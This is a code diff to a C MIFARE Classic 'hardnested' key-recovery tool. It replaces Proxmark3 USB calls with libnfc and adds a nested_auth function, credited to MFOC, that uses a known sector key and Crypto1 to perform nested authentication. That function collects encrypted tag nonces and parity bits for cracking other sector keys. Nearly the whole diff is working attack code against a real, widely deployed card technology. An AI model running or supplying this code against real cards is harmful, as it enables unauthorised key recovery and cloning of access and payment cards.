@@ -24,6 +24,7 @@
 #include <pthread.h>
 #include <locale.h>
 #include <math.h>
+#include <nfc/nfc.h>
 //#include "proxmark3.h"
 //#include "comms.h"
 //#include "cmdmain.h"
@@ -207,16 +208,16 @@ static int compare_count_bitflip_bitarrays(const void *b1, const void *b2)
 }
 
 
-static voidpf inflate_malloc(voidpf opaque, uInt items, uInt size)
-{
-	return malloc(items*size);
-}
-
-
-static void inflate_free(voidpf opaque, voidpf address)
-{
-	free(address);
-}
+//static voidpf inflate_malloc(voidpf opaque, uInt items, uInt size)
+//{
+//	return malloc(items*size);
+//}
+//
+//
+//static void inflate_free(voidpf opaque, voidpf address)
+//{
+//	free(address);
+//}
 
 #define OUTPUT_BUFFER_LEN 80
 #define INPUT_BUFFER_LEN 80
@@ -224,20 +225,20 @@ static void inflate_free(voidpf opaque, voidpf address)
 //----------------------------------------------------------------------------
 // Initialize decompression of the respective (HF or LF) FPGA stream 
 //----------------------------------------------------------------------------
-static void init_inflate(z_streamp compressed_stream, uint8_t *input_buffer, uint32_t insize, uint8_t *output_buffer, uint32_t outsize)
-{
-
-	// initialize z_stream structure for inflate:
-	compressed_stream->next_in = input_buffer;
-	compressed_stream->avail_in = insize;
-	compressed_stream->next_out = output_buffer;
-	compressed_stream->avail_out = outsize;
-	compressed_stream->zalloc = &inflate_malloc;
-	compressed_stream->zfree = &inflate_free;
-
-	inflateInit2(compressed_stream, 0);
-	
-}
+//static void init_inflate(z_streamp compressed_stream, uint8_t *input_buffer, uint32_t insize, uint8_t *output_buffer, uint32_t outsize)
+//{
+//
+//	// initialize z_stream structure for inflate:
+//	compressed_stream->next_in = input_buffer;
+//	compressed_stream->avail_in = insize;
+//	compressed_stream->next_out = output_buffer;
+//	compressed_stream->avail_out = outsize;
+//	compressed_stream->zalloc = &inflate_malloc;
+//	compressed_stream->zfree = &inflate_free;
+//
+//	inflateInit2(compressed_stream, 0);
+//	
+//}
 
 const char *get_my_executable_directory() {
     char cwd[1024];
@@ -1435,10 +1436,195 @@ static void simulate_acquire_nonces()
 		
 }
 
+nfc_device* pnd;
+static nfc_context *context;
+uint32_t uid;
+nfc_target target;
+
+uint64_t known_key;
+uint8_t for_block;
+uint8_t ab_key;
+uint8_t target_block;
+uint8_t target_key;
+
+const nfc_modulation nmMifare = {
+    .nmt = NMT_ISO14443A,
+    .nbr = NBR_106,
+};
+
+#define MC_AUTH_A 0x60
+#define MC_AUTH_B 0x61
+#define MAX_FRAME_LEN 264
+
+enum {
+    OK,
+    ERROR,
+    KEY_WRONG,
+};
+
+
+uint8_t oddparity(const uint8_t bt)
+{
+  // cf http://graphics.stanford.edu/~seander/bithacks.html#ParityParallel
+  return (0x9669 >> ((bt ^(bt >> 4)) & 0xF)) & 1;
+}
+
+// Almost entirely based on code from Mifare Offline Cracker (MFOC) by Nethemba, cheers guys! :)
+int nested_auth(uint32_t uid, uint64_t known_key, uint8_t ab_key, uint8_t for_block, uint8_t target_block, uint8_t target_key, bool fp)
+{
+    uint64_t *pcs;
+
+    // Possible key counter, just continue with a previous "session"
+    uint8_t Nr[4] = { 0x00, 0x00, 0x00, 0x00 }; // Reader nonce
+    uint8_t Cmd[4] = { 0x00, 0x00, 0x00, 0x00 };
+
+    uint8_t ArEnc[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+    uint8_t ArEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+
+    uint8_t Rx[MAX_FRAME_LEN]; // Tag response
+    uint8_t RxPar[MAX_FRAME_LEN]; // Tag response
+
+    uint32_t Nt;
+    
+    uint8_t pbits = 0;
+    uint8_t p = 0;
+
+    int i;
+
+    // Prepare AUTH command
+    Cmd[0] = ab_key;
+    Cmd[1] = for_block;
+    iso14443a_crc_append(Cmd, 2);
+
+    // We need full control over the CRC
+    if (nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false) < 0)  {
+        nfc_perror(pnd, "nfc_device_set_property_bool crc");
+        return ERROR;
+    }
+
+    // Request plain tag-nonce
+    // TODO: Set NP_EASY_FRAMING option only once if possible
+    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false) < 0) {
+        nfc_perror(pnd, "nfc_device_set_property_bool framing");
+        return ERROR;
+    }
+
+    if (nfc_initiator_transceive_bytes(pnd, Cmd, 4, Rx, sizeof(Rx), 0) < 0) {
+        fprintf(stdout, "Error while requesting plain tag-nonce ");
+        return ERROR;
+    }
+
+    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, true) < 0) {
+        nfc_perror(pnd, "nfc_device_set_property_bool");
+        return ERROR;
+    }
+
+    // Save the tag nonce (Nt)
+    Nt = bytes_to_num(Rx, 4);
+
+    // Init the cipher with key {0..47} bits
+    pcs = (uint64_t *) crypto1_create(known_key);
+
+    // Load (plain) uid^nt into the cipher {48..79} bits
+    crypto1_word((struct Crypto1State*)pcs, bytes_to_num(Rx, 4) ^ uid, 0);
+
+    // Generate (encrypted) nr+parity by loading it into the cipher
+    for (i = 0; i < 4; i++) {
+        // Load in, and encrypt the reader nonce (Nr)
+        ArEnc[i] = crypto1_byte((struct Crypto1State*)pcs, Nr[i], 0) ^ Nr[i];
+        ArEncPar[i] = filter(*pcs) ^ oddparity(Nr[i]);
+    }
+
+    // Skip 32 bits in the pseudo random generator
+    Nt = prng_successor(Nt, 32);
+
+    // Generate reader-answer from tag-nonce
+    for (i = 4; i < 8; i++) {
+        // Get the next random byte
+        Nt = prng_successor(Nt, 8);
+        // Encrypt the reader-answer (Nt' = suc2(Nt))
+        ArEnc[i] = crypto1_byte((struct Crypto1State*)pcs, 0x00, 0) ^(Nt & 0xff);
+        ArEncPar[i] = filter(*pcs) ^ oddparity(Nt);
+    }
+
+    // Finally we want to send arbitrary parity bits
+    if (nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, false) < 0) {
+        nfc_perror(pnd, "nfc_device_set_property_bool parity ");
+        return 1;
+    }
+
+    // Transmit reader-answer
+    int res;
+    if (((res = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
+        fprintf(stderr, "Reader-answer transfer error, exiting.. ");
+        return KEY_WRONG;
+    }
+
+    // Decrypt the tag answer and verify that suc3(Nt) is At
+    Nt = prng_successor(Nt, 32);
+
+    if (!((crypto1_word((struct Crypto1State*)pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
+        fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting.. ");
+        return ERROR;
+    }
+
+    Cmd[0] = target_key;
+    Cmd[1] = target_block;
+    iso14443a_crc_append(Cmd, 2);
+
+    for (i = 0; i < 4; i++) {
+        ArEnc[i] = crypto1_byte((struct Crypto1State*)pcs, 0, 0) ^ Cmd[i];
+        ArEncPar[i] = filter(*pcs) ^ oddparity(Cmd[i]);
+    }
+    if (((res = nfc_initiator_transceive_bits(pnd, ArEnc, 32, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
+        fprintf(stderr, "Reader-answer transfer error, exiting.. ");
+        return ERROR;
+    }
+
+    if(fp){
+        for(i = 0; i < 4; i++){
+            p = oddparity(Rx[i]);
+//            fprintf(fp,"%02x", Rx[i]);
+            if(RxPar[i] != oddparity(Rx[i])){
+//                fprintf(fp,"! ");
+                p^=1;
+            }
+//            else {
+//                fprintf(fp,"  ");
+//            }
+            pbits <<= 1;
+            pbits |= p;
+        }
+        num_acquired_nonces += add_nonce(bytes_to_num(Rx, 4), pbits);
+//        fprintf(fp, "\n");
+    }
+//    if(nonces){
+//        nonces[nonces_collected] = 0;
+//        for(i = 0; i < 4; i++){
+//            nonces[nonces_collected] |= ((uint64_t) Rx[i]) << (8*i);
+//            nonces[nonces_collected] |= ((uint64_t) !RxPar[i]) << (32 + (8*i));
+//        }
+//        nonces_collected++;
+//    }
+
+    crypto1_destroy((struct Crypto1State*)pcs);
+    return OK;
+}
+
+// Sectors 0 to 31 have 4 blocks per sector.
+// Sectors 32 to 39 have 16 blocks per sector.
+uint8_t block_to_sector(uint8_t block)
+{
+    if(block < 128) {
+        return block >> 2;
+    }
+    block -= 128;
+    return 32 + (block >> 4);
+}
 
 static int acquire_nonces(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo, uint8_t trgKeyType, bool nonce_file_write, bool slow)
 {
-	/*last_sample_clock = msclock();
+	last_sample_clock = msclock();
 	sample_period = 2000;	// initial rough estimate. Will be refined.
 	bool initialize = true;
 	bool field_off = false;
@@ -1446,34 +1632,91 @@ static int acquire_nonces(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_
 	bool acquisition_completed = false;
 	uint32_t flags = 0;
 	uint8_t write_buf[9];
-	uint32_t total_num_nonces = 0;
+//	uint32_t total_num_nonces = 0;
 	float brute_force;
 	bool reported_suma8 = false;
 	FILE *fnonces = NULL;
-	UsbCommand resp;
+//	UsbCommand resp;
 
 	num_acquired_nonces = 0;
 	
-	clearCommandBuffer();
+//	clearCommandBuffer();
 
 	do {
 		flags = 0;
 		flags |= initialize ? 0x0001 : 0;
 		flags |= slow ? 0x0002 : 0;
 		flags |= field_off ? 0x0004 : 0;
-		UsbCommand c = {CMD_MIFARE_ACQUIRE_ENCRYPTED_NONCES, {blockNo + keyType * 0x100, trgBlockNo + trgKeyType * 0x100, flags}};
-		memcpy(c.d.asBytes, key, 6);
+//		UsbCommand c = {CMD_MIFARE_ACQUIRE_ENCRYPTED_NONCES, {blockNo + keyType * 0x100, trgBlockNo + trgKeyType * 0x100, flags}};
+//		memcpy(c.d.asBytes, key, 6);
 
-		SendCommand(&c);
+//		SendCommand(&c);
 		
 		if (field_off) break;
 		
 		if (initialize) {
-			if (!WaitForResponseTimeout(CMD_ACK, &resp, 3000)) return 1;
+//			if (!WaitForResponseTimeout(CMD_ACK, &resp, 3000)) return 1;
 
-			if (resp.arg[0]) return resp.arg[0];  // error during nested_hard
+//			if (resp.arg[0]) return resp.arg[0];  // error during nested_hard
 
-			cuid = resp.arg[1];
+                    
+                    nfc_init(&context);
+                    pnd = nfc_open(context, NULL);
+
+                    if (pnd == NULL) {
+                        fprintf(stderr, "No NFC device connection\n");
+                        return 1;
+                    }
+
+                    nfc_initiator_init(pnd);
+
+                    nfc_device_set_property_bool(pnd,NP_ACTIVATE_FIELD,false);
+                    // Let the reader only try once to find a tag
+                    nfc_device_set_property_bool(pnd,NP_INFINITE_SELECT,false);
+                    nfc_device_set_property_bool(pnd,NP_HANDLE_CRC,true);
+                    nfc_device_set_property_bool(pnd,NP_HANDLE_PARITY,true);
+                    nfc_device_set_property_bool(pnd,NP_AUTO_ISO14443_4, false);
+
+//                    uid = 0;
+
+                    // Enable field so more power consuming cards can power themselves up
+                    nfc_device_set_property_bool(pnd,NP_ACTIVATE_FIELD,true);
+                    if (nfc_initiator_select_passive_target(pnd,nmMifare,NULL,0,&target)) {
+                        cuid = bytes_to_num(target.nti.nai.abtUid,target.nti.nai.szUidLen);
+                    }
+
+                    if(!cuid){
+                        fprintf(stderr, "No tag detected!\n");
+                        // Disconnect from NFC device
+                        nfc_close(pnd);
+                        return 1;
+                    }
+
+                    known_key = bytes_to_num(key, 6);
+                //    known_key = 0;
+                    for_block = blockNo;
+                    ab_key = MC_AUTH_A;
+                    if(keyType){
+                       ab_key = MC_AUTH_B;
+                    }
+                    target_block = trgBlockNo;
+                    target_key = MC_AUTH_A;
+                    if(trgKeyType){
+                       target_key = MC_AUTH_B;
+                    }
+                    switch(nested_auth(cuid, known_key, ab_key, for_block, target_block, target_key, false)){
+                        case KEY_WRONG:
+                            printf("%012"PRIx64" doesn't look like the right key %s for block %u (sector %u)\n", known_key, ab_key == MC_AUTH_A ? "A" : "B", for_block, block_to_sector(for_block));
+                            return 1;
+                        case OK:
+                            break;
+                        case ERROR:
+                        default:
+                            printf("Some other error occurred.\n");
+                            break;
+                    }
+                    
+//			cuid = resp.arg[1];
 			// PrintAndLog("Acquiring nonces for CUID 0x%08x", cuid); 
 			if (nonce_file_write && fnonces == NULL) {
 				if ((fnonces = fopen("nonces.bin","wb")) == NULL) { 
@@ -1489,26 +1732,38 @@ static int acquire_nonces(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_
 		}
 
 		if (!initialize) {
-			uint32_t nt_enc1, nt_enc2;
-			uint8_t par_enc;
-			uint16_t num_sampled_nonces = resp.arg[2];
-			uint8_t *bufp = resp.d.asBytes;
-			for (uint16_t i = 0; i < num_sampled_nonces; i+=2) {
-				nt_enc1 = bytes_to_num(bufp, 4);
-				nt_enc2 = bytes_to_num(bufp+4, 4);
-				par_enc = bytes_to_num(bufp+8, 1);
-				
-				//printf("Encrypted nonce: %08x, encrypted_parity: %02x\n", nt_enc1, par_enc >> 4);
-				num_acquired_nonces += add_nonce(nt_enc1, par_enc >> 4);
-				//printf("Encrypted nonce: %08x, encrypted_parity: %02x\n", nt_enc2, par_enc & 0x0f);
-				num_acquired_nonces += add_nonce(nt_enc2, par_enc & 0x0f);
-
-				if (nonce_file_write) {
-					fwrite(bufp, 1, 9, fnonces);
-				}
-				bufp += 9;
-			}
-			total_num_nonces += num_sampled_nonces;
+//			uint32_t nt_enc1, nt_enc2;
+//			uint8_t par_enc;
+//			uint16_t num_sampled_nonces = resp.arg[2];
+//			uint8_t *bufp = resp.d.asBytes;
+//			for (uint16_t i = 0; i < num_sampled_nonces; i+=2) {
+//				nt_enc1 = bytes_to_num(bufp, 4);
+//				nt_enc2 = bytes_to_num(bufp+4, 4);
+//				par_enc = bytes_to_num(bufp+8, 1);
+//				
+//				//printf("Encrypted nonce: %08x, encrypted_parity: %02x\n", nt_enc1, par_enc >> 4);
+//				num_acquired_nonces += add_nonce(nt_enc1, par_enc >> 4);
+//				//printf("Encrypted nonce: %08x, encrypted_parity: %02x\n", nt_enc2, par_enc & 0x0f);
+//				num_acquired_nonces += add_nonce(nt_enc2, par_enc & 0x0f);
+//
+//				if (nonce_file_write) {
+//					fwrite(bufp, 1, 9, fnonces);
+//				}
+//				bufp += 9;
+//			}
+                        
+//                        for (uint32_t i = 0; i< 10; i++ ) {
+                            nfc_device_set_property_bool(pnd,NP_HANDLE_CRC,true);
+                            nfc_device_set_property_bool(pnd,NP_HANDLE_PARITY,true);
+                            // Poll for a ISO14443A (MIFARE) tag
+                            if (nfc_initiator_select_passive_target(pnd,nmMifare,NULL,0,&target)) {
+                                nested_auth(cuid, known_key, ab_key, for_block, target_block, target_key, true);
+                            } else {
+                                printf("Don't move the tag!\n");
+                                fflush(stdout);
+                            }
+//                        }
+//			total_num_nonces +=4;
 		
 			if (first_byte_num == 256 ) {
 				if (hardnested_stage == CHECK_1ST_BYTES) {
@@ -1542,20 +1797,20 @@ static int acquire_nonces(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_
 			field_off = true;	// switch off field with next SendCommand and then finish
 		}
 
-		if (!initialize) {
-			if (!WaitForResponseTimeout(CMD_ACK, &resp, 3000)) {
-				if (nonce_file_write) {
-					fclose(fnonces);
-				}
-				return 1;
-			}
-			if (resp.arg[0]) {
-				if (nonce_file_write) {
-					fclose(fnonces);
-				}
-				return resp.arg[0];  // error during nested_hard
-			}
-		}
+//		if (!initialize) {
+//			if (!WaitForResponseTimeout(CMD_ACK, &resp, 3000)) {
+//				if (nonce_file_write) {
+//					fclose(fnonces);
+//		}
+//				return 1;
+//			}
+//			if (resp.arg[0]) {
+//				if (nonce_file_write) {
+//					fclose(fnonces);
+//				}
+//				return resp.arg[0];  // error during nested_hard
+//			}
+//		}
 
 		initialize = false;
 
@@ -1574,7 +1829,7 @@ static int acquire_nonces(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_
 		// total_num_nonces, 
 		// time(NULL)-time1, 
 		// (float)total_num_nonces*60.0/(time(NULL)-time1));
-	*/
+	
 	return 0;
 }
 
